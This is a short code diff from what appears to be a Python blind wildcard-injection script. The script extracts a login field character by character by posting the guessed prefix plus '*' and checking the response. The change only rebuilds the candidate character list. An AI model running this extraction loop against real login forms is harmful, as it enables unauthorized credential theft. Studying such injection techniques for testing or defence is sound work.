@@ -15,14 +15,12 @@ results = args.result
 body = {'username': '*', 'password': '*'}
 result = ''
 
-strings = list(string.ascii_letters) + list(string.digits) + list(string.punctuation)
-remove_special = str.maketrans('', '', '*')
-clean_list = [s.translate(remove_special) for s in strings]
+strings = list(string.ascii_letters) + list(string.digits) + ['!', '"', '#', '$', '%', '&', "'", '(', ')', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', ']', '^', '_', '`', '{', '|', '}', '~']
 
 test = 1
 while test == 1:
     test = 0
-    for x in clean_list:
+    for x in strings:
         body[param] = result + x + '*'
         r = requests.post(url, data = body)
         if (results in r.text):
